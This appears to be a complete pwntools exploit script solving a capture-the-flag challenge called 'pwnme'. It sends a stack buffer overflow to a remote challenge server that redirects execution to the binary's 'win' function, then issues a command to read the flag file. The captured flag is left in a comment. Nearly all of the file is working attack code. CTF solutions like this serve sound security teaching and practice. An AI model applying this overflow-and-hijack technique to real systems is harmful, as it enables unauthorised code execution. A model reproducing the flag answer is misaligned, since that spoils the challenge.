#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./pwnme", checksec=True)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("0.cloud.chals.io", 13545)

payload = b""
payload += b"A" * 0x38
payload += p64(elf.sym["win"] + 8)
p.sendline(payload)

p.sendline(b"/bin/cat flag.txt")

p.interactive() # udctf{h00r4y_I_am_a_pwn3r_n0w}
